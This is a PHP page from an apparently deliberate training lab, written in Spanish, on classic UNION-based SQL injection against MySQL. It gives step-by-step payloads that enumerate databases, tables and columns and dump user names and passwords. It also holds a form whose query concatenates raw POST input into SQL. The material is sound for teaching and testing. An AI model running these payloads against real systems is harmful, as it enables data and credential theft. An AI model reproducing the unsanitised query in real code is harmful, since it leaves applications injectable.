<?php include("../../header.php"); ?>

<title>Clasico SQL Injection</title>

<section id="template">
      <div class="container">
        <div class="row">
          <div class="col-md-12">
            <h3 class="title text-center">Clasico SQL Injection</h3>
            <div class="titleHR"><span></span></div>
          </div>
        </div>
        <p>Estes un claro ejemplo que puede suceder en una pagina, la entrada que recibe espera que sea un valor de entero o flotante para poder mostrar los productos entre el valor 0 hasta el valor maximo ingresado</p>

        <h2>Pasos</h2>

        <h3>Detectar vulnerabilidad</h3>

        <p>Lo primero que se debe hacer en una sql inyeccion es reconocer que existe una ejecucion de comandos, la prueba para saber esto es colocar una simple ' que hace generar un error al ejecutar la consulta y mostrara un error de mysql o el gestor de base de datos o la respuesta puede cambiar al mostrar los resultados como en este caso.</p>

        <h3>Listar columnas</h3>

        <p>Para dar salidas y ejecutar consultas ademas de la que normalmente se ejecuta se debe de tener en cuenta cuantas columnas hay para mostrar ahi los resultasdos. Esto se puede hacer de dos maneras que se utilizan en sql. Podria ser el order by o el union select null. Si se agrega el valor de 50 y se une alguno de los anteriores payloads seria algo asi:</p>

        <pre>100 order by 1&NewLine;100 order by 2&NewLine;100 order by 3&NewLine;100 order by n&NewLine;&NewLine;100 union select null&NewLine;100 union select null&comma;null&NewLine;100 union select null&comma;null&comma;null&comma;&period;&period;&period;</pre>

        <p>La idea de este ultimas pruebas es visualizar cuantas columnas contiene, si al llegar al enumerar las columnas se recibe un error de parte de la aplicacion se lleva al numero de columnas que utilizan.En este caso la columnas son 4 porque al ingresar ya sea order by 5 o 5 null ya no muestra ningun resultado.</p>

        <h3>Listar las bases de datos</h3>

        <p>A continuacion es la forma de listar base de datos en mysql haciendo un sql injection:</p>

        <pre>100 union select gRoUp&lowbar;cOncaT&lpar;0x7c&comma;schema&lowbar;name&comma;0x7c&rpar;&comma;null&comma;null&comma;null fRoM information&lowbar;schema&period;schemata</pre>

        <h3>Listar las tablas de la base de datos:</h3>

        <p>Teniendo las base de datos ahora tomaremos las tablas de esa base de datos, usando como ejemplo la base de datos "proyecto"</p>

        <pre>100 union select gRoUp&lowbar;cOncaT&lpar;0x7c&comma;table&lowbar;name&comma;0x7C&rpar;&comma;null&comma;null&comma;null fRoM information&lowbar;schema&period;tables wHeRe table&lowbar;schema&equals;&quot;proyecto&quot;</pre>

        <h3>Listar las columnas de la base de datos:</h3>

        <p>Teniendo las tablas ahora toca listar las columans de las tablas usando como ejemplo la tabla "users" ya que es la que nos dejaria entrar al sistema.</p>

        <pre>100 union select gRoUp&lowbar;cOncaT&lpar;0x7c&comma;column&lowbar;name&comma;0x7C&rpar;&comma;null&comma;null&comma;null fRoM information&lowbar;schema&period;columns wHeRe table&lowbar;name&equals;&quot;users&quot;&NewLine;</pre>

        <h3>Listar los datos de las columnas:</h3>

        <p>En este caso usaremos los nombres de las columnas que tomamos del anterior paso y listaremos los datos segun el valor de las columnas.</p>

        <pre>100 union select gRoUp&lowbar;cOncaT&lpar;0x7c&comma;name&comma;0x7C&comma;password&rpar;&comma;null&comma;null&comma;null fRoM users</pre>

        <p>De esta manera es posible extraer datos de manera manual hacia la base de datos viendo que el programador no filtra sus datos. Aclarando que esta es la manera de explotar mysql claramente la sintaxis cambiara para otros gestores de base de datos.</p>

        <h1>Explotacion</h1>

      <form action="<?php echo $_SERVER["PHP_SELF"]; ?>" method="post">
        Ingrese el precio maximo de los productos a ver:
        <input type="text" name="precio">
        <input type="submit" value="Ver Productos">
      </form>
      <br>

<?php
    require 'connection.php';

    if (isset($_POST["precio"]) && $_POST["precio"]!=""){
      $var_consulta= "select * from products where price <= ".$_POST["precio"].";";
      $var_resultado = $obj_conexion->query($var_consulta);
      echo "<div class=\"alert alert-success\" role=\"alert\">Tu consulta sql es: <br><strong>$var_consulta</strong></div>";
    }else{
      $var_consulta= "select * from products;";
      $var_resultado = $obj_conexion->query($var_consulta);
      echo "<div class=\"alert alert-success\" role=\"alert\">Tu consulta sql es: <br><strong>$var_consulta</strong></div>";
    }
    
    if($var_resultado->num_rows>0){
        echo"<table class=\"table\">
        <tr bgcolor='#E6E6E6'>
            <th>ID</th>
            <th>Nombre</th>
            <th>Precio</th>
            <th>Disponible</th>
        </tr>";
        while ($var_fila=$var_resultado->fetch_array()){
          echo "<tr>";
          echo "<td>".$var_fila["id"]."</td>";
          echo "<td>".$var_fila["name"]."</td>";
          echo "<td>".$var_fila["price"]."</td>";
          echo "<td>".$var_fila["stock"]."</td>";
          echo "</tr>";
        }
        echo "</table>";
    }else{
      echo "No hay Registros";
    }
?>
    </div> <!--/.container -->
</section> 

<?php include("../../footer.php"); ?>